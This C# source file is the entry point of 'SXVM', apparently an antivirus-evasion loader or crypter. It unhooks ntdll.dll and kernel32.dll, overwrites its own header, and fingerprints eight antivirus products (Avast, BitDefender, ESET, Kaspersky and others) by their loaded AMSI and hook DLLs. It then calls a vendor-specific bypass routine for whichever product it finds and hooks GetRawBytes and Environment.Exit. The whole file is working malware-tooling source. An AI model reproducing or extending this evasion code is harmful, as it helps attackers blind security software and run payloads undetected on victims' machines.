using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO.Compression;
using System.IO;
using System.Linq;
using System.Reflection.Emit;
using System.Reflection;
using System.Runtime.ExceptionServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static SXVM.API;
using static SXVM.Settings;
using SXVM.Bypasses;
using SXVM.Hooks;

namespace SXVM
{
    //[INFO] - Compile as Debug - x64.
    internal static class Program
    {
        private static ushort ExcludedHeader = 0x4F8F;

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main(string[] args)
        {
            ushort oldHeader = 0;
            WriteCustomHeader(ExcludedHeader, out oldHeader);

            Unhooker.Unhook(@"ntdll.dll");
            Unhooker.Unhook(@"kernel32.dll");

            PrepareHandlers(args);

            string AntiVirus = @"";

            foreach (ProcessModule module in Process.GetCurrentProcess().Modules)
            {
                if (module.ModuleName == @"aswAMSI.dll" || module.ModuleName == @"aswhook.dll")
                {
                    AntiVirus = @"Avast";
                    break;
                }
                else if (module.ModuleName == @"atcuf64.dll" || module.ModuleName == @"bdhkm64.dll")
                {
                    AntiVirus = @"BitDefender";
                    break;
                }
                else if (module.ModuleName == @"fsamsi64.dll" || module.ModuleName == @"fshook64.dll" || module.ModuleName == @"fs_ccf_ipc_64.dll")
                {
                    AntiVirus = @"F-Secure";
                    break;
                }
                else if (module.ModuleName == @"hmpalert.dll" || module.ModuleName == @"SophosAmsiProvider.dll")
                {
                    AntiVirus = @"Sophos";
                    break;
                }
                else if (module.ModuleName == @"eamsi.dll")
                {
                    AntiVirus = @"ESET";
                    break;
                }
                else if (module.ModuleName == @"com_antivirus.dll")
                {
                    AntiVirus = @"Kaspersky";
                    break;
                }
                else if (module.ModuleName == @"symamsi.dll")
                {
                    AntiVirus = @"Norton";
                    break;
                }
                else if (module.ModuleName == @"mbae64.dll")
                {
                    AntiVirus = @"Malwarebytes";
                    break;
                }
                else
                {
                }
            }

            switch (AntiVirus)
            {
                case @"Avast":
                    Avast.Bypass(args);
                    break;
                case @"BitDefender":
                    BitDefender.Bypass(args);
                    break;
                case @"F-Secure":
                    Default.Bypass(args);
                    break;
                case @"Sophos":
                    Default.Bypass(args);
                    break;
                case @"ESET":
                    ESET.Bypass(args);
                    break;
                case @"Kaspersky":
                    Kaspersky.Bypass(args);
                    break;
                case @"Norton":
                    Default.Bypass(args);
                    break;
                case @"Malwarebytes":
                    Default.Bypass(args);
                    break;
                default:
                    Default.Bypass(args);
                    break;
            }

            throw new AccessViolationException();
        }

        private static void PrepareHandlers(string[] args)
        {
            RegisterHandler(@"BypassDisabled", (HandlerArgs) =>
            {
                throw new AccessViolationException();
                return null;
            });
        }

        internal static void AttachHooks(string[] args)
        {
            GetRawBytes.Hook(args);

            EnvironmentExit.Hook(args);
        }
    }
}
